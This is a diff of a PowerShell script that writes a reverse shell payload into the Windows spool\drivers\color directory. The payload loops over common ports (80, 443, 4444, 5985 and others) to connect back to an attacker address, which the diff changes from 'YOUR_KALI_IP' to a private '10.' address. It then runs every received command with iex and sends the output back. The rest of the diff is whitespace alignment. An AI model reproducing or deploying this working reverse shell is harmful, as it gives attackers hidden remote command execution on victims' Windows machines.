@@ -4,7 +4,7 @@ $dir = "C:\Windows\System32\spool\drivers\color"
 # full reverse shell payload written as a here-string so special chars are preserved
 $payload = @'
 $ports = @(80, 443, 8080, 3306, 4444, 5985, 8443)
-$ip = "YOUR_KALI_IP"
+$ip    = "10."
 
 while ($true) {
     foreach ($port in $ports) {
@@ -17,9 +17,9 @@ while ($true) {
                 $i = $stream.Read($buf, 0, $buf.Length)
                 if ($i -eq 0) { break }
 
-                $command = [System.Text.Encoding]::UTF8.GetString($buf, 0, $i).Trim()
-                $output = (iex $command 2>&1 | Out-String)
-                $prompt = "PS " + (Get-Location).Path + "> "
+                $command  = [System.Text.Encoding]::UTF8.GetString($buf, 0, $i).Trim()
+                $output   = (iex $command 2>&1 | Out-String)
+                $prompt   = "PS " + (Get-Location).Path + "> "
                 $response = [System.Text.Encoding]::UTF8.GetBytes($output + $prompt)
                 $stream.Write($response, 0, $response.Length)
                 $stream.Flush()
